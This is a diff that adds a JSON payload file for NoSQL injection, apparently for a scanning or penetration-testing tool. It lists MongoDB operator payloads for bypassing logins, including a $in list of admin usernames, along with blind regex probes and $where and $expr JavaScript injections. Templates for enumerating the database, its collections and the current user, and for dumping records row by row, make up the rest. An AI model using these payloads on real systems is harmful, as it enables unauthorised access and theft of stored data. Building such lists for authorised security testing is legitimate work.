@@ -1,0 +1,53 @@
+{
+  "auth_bypass": [
+    {"$ne": null},
+    {"$ne": ""},
+    {"$gt": ""},
+    {"$ne": 1},
+    {"$ne": "invalid"},
+    {"$nin": []},
+    {"$not": {"$type": 10}},
+    {"$or": [{"a": 1}, {"b": 1}]},
+    {"$regex": ".*"},
+    {"$regex": "^a"},
+    {"$exists": true},
+    {"$size": 0},
+    {"$ne": {"$gt": 1}},
+    {"$in": ["admin", "root", "superuser", "administrator", "support"]}
+  ],
+  "blind_regex": [
+    {"$regex": ".*"},
+    {"$regex": "^.{length}$"}
+  ],
+  "js_injection": [
+    {"$where": "return true"},
+    {"$where": "1 == 1"},
+    {"$where": "this.password != ''"},
+    {"$where": "function() { return true }"},
+    {"$where": "' || true || '"},
+    {"$where": "'; return true; //"},
+    {"$where": "1; return true"},
+    {"$expr": {"$eq": [1, 1]}},
+    {"$expr": {"$gt": [{"$strLenCP": "$password"}, 0]}}
+  ],
+  "enumeration_templates": {
+    "mongodb": {
+      "current_db": "db.getName()",
+      "collections": "db.getCollectionNames().toString()",
+      "current_user": "db.runCommand({connectionStatus: 1}).authInfo.authenticatedUsers[0].user",
+      "data_dump_template": "db.getSiblingDB('{DB}').{COLLECTION}.find().limit(1).skip({ROW_INDEX}).toArray()[0].{COLUMN}.toString()"
+    },
+    "couchdb": {
+      "current_db": "/* Not implemented */",
+      "collections": "/* Not implemented */",
+      "current_user": "/* Not implemented */",
+      "data_dump_template": "/* Not implemented */"
+    },
+    "generic": {
+      "current_db": "db.getName()",
+      "collections": "db.getCollectionNames().toString()",
+      "current_user": "db.runCommand({connectionStatus: 1}).authInfo.authenticatedUsers[0].user",
+      "data_dump_template": "db.getSiblingDB('{DB}').{COLLECTION}.find().limit(1).skip({ROW_INDEX}).toArray()[0].{COLUMN}.toString()"
+    }
+  }
+}
